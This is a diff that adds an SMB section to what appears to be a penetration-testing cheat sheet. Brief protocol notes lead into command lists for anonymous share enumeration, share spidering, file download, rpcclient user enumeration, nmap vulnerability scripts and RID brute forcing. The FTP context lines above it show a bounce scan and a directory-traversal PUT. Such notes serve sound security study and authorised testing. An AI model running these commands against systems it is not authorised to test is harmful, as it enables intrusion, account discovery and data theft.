@@ -48,3 +48,63 @@ nmap -Pn -v -n -p80 -b anonymous:password@$TARGET_IP $INTERNAL_IP
 # FTP directory traversal vulnerability
 curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
 ```
+
+
+## SMB
+
+- Server Message Block, uses TCP.
+- A client-server protocol that regulates access to files and entire directories and other network resources.
+- Access rights are defined by ACLs.
+- The ACLs are defined based on the shares and do not correspond to the rights assigned locally on the server.
+
+
+- Samba implements the Common Internet File System (CIFS) network protocol.
+- CIFS is a specific version of SMB.
+- When SMB commands are transmitted over Samba to an older NetBIOS service,
+connection occur over TCP ports `137, 138, and 139`.
+- CIFS operates over TCP port `445` exclusively.
+- Dangerous settings include: allow guest to connect, insecure default permissions of files,
+logon script, magic script etc
+
+```shell
+# Accessing shares using null credentials
+smbclient -N -L //$TARGET_IP
+crackmapexec smb $TARGET_IP -u '' -p '' --shares
+netexec smb $TARGET_IP -u '' -p '' -M spider_plus
+smbmap -H $TARGET_IP
+
+# Getting data from the shares
+netexec smb $TARGET_IP -u $USER -p $PASS --shares --filter-shares READ WRITE
+netexec smb $TARGET_IP -u $USER -p $PASS -M spider_plus
+
+# Enumerating using enum4linux
+enum4linux-ng.py $TARGET_IP -A  
+
+# Downloading files
+smbmap -H $TARGET_IP -u $USER -p $PASS --download $FILE_PATH
+```
+
+```shell
+# Enumerating using rpcclient
+rpcclient -U "" $TARGET_IP
+rpcclient $> srvinfo
+rpcclient $> enumdomains
+rpcclient $> enumdomusers
+rpcclient $> queryuser $RID
+rpcclient $> querygroup $GID
+rpcclient $> querydominfo
+rpcclient $> netshareenumall
+rpcclient $> netshareenumall $SHARENAME
+```
+
+- Attacking SMB:
+
+```shell
+# Using nmap scripts
+sudo nmap $TARGET_IP -sV -sC -p139,445
+nmap --script smb-vuln* -p 139,445 $TARGET_IP
+# RID Brute forcing
+samrdump.py $DOMAIN/$USER:$PASSWORD@$TARGET_IP
+lookupsid.py guest@$TARGET_IP -no-pass
+netexec smb $TARGET_IP -u guest -p '' --rid-brute
+```
